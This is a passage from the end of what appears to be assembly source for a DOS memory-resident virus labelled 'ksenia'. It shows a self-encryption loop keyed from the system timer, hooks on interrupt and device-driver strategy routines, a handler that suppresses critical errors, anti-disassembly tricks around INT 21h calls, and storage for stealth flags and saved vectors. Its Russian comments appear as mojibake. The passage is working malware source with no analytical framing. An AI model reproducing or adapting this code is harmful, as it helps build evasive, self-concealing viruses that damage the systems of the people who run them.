    endcr: mov     si,bx
           mov     ax,word ptr cs:[decrtable+bp+si]
           mov     cs:[algorithm+bp],ax

           lea     si,crmain+bp    ; encrypt main engine
           mov     cx,endcr-crmain
           in      al,40h
           mov     cs:pre_ki+bp,al
    c2:    xor     cs:[si],al
           inc     si
           loop    c2

           pop     ds
           popa
           popf
    cr_ret:
           ret
    ;_________--------------________
    strategy:
           push    bp
           call    extra
           mov     cs:[req_head+bp],bx
           mov     cs:[req_head+bp+2],es
           pop     bp
           db      68h
    old_strategy   dw  ?
           ret

    win_trick:
           nop
           nop
           db      0eah
    win21  dw      ?,?


    int24h:
           db      0c0h,0e0h,10h           ; shl (¨«¨ shr) al,10h => zero
           stc
           rcl     al,3                    ; ¯®«ãç¨¬ al = 4
           dec     al
           iret                            ; ã § ¥¡¥¨« !!!

    crypt_int21_crypt:
           call    crypt
           push    offset crypt
    int21:
           pushf                           ; ¢ë§®¢ 21-£® ¨â 
           db     0ebh,3                   ; ¯à¨¬¥¨« ¯¥à¥ªàë¢ îé¨©áï ª®¤
           mov    ax,04ebh
           jmp    $-2
           dw     0ffffh
           db     09ah                     ; call far ptr ..
    io21   dw     ?,?
           ret

    extra:                                 ; ¢ëç¨á«ï¥¬ ¤®¯®«¨â¥«ì®¥ á¬¥é¥¨¥
           pushf
           push    eax
           db      66h,0b8h
           int     1ch
    subextr:
           jmp     $+4
           jmp     $-4
           mov     bp,sp                   ; áç¨â âì ¢¥àè¨ã áâ¥ª 
           mov     bp,word ptr [bp-6]
           sub     bp,offset subextr
           pop     eax
           popf
           ret

    eov:

    io1                    dw      ?,?             ; ã¡¥¦¨é¥ ¤«ï ¢¥ªâ®à®¢
    io9                    dw      ?,?
    io1c                   dw      ?,?
    io24                   dw      ?,?

    req_head               dw      ?,?
    point                  dw      ?               ; ¤«ï ®¡à ¡®âç¨ª  int 09h
    resthost               db      ?
    _addr21                dw      ?,?
    splint                 db      ?
    keepword               dw      ?
    prev2                  dw      ?               ;  ç «® 21-£® ®¡à ¡®âç¨ª 
    stf                   db      ?               ; ä« £ ¤«ï ®¡é¥£® áâ¥«á 
    drf                    db      ?               ; ä« £ ¤«ï fcb áâ¥«á 
    seek_pos               dw      ?,?             ; ¬¥áâ® åà ¥¨ï seek 
    nrbytes                dw      ?               ; â®¦¥ ¤«ï áç¨â ëå ¡ ©â
    func_number            dw      ?
    func_jump              dw      ?
    two_bytes              dw      ?
    sys_sp                 dw      ?
    sys_ss                 dw      ?
    psp                    dw      ?

    buffer                 db      vsize dup (?)


    eom:                   end     ksenia

   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
